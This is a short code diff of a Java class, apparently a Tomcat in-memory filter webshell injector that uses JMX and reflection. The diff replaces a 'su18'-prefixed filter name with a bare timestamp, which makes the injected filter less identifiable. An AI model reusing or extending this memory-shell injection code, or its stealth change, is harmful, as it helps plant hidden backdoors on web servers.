@@ -25,7 +25,7 @@ public class TFMSFromJMX implements Filter {
 
 	static {
 		try {
-			String filterName = "su18" + System.nanoTime();
+			String filterName = String.valueOf(System.nanoTime());
 
 			MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
 			Field       field       = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
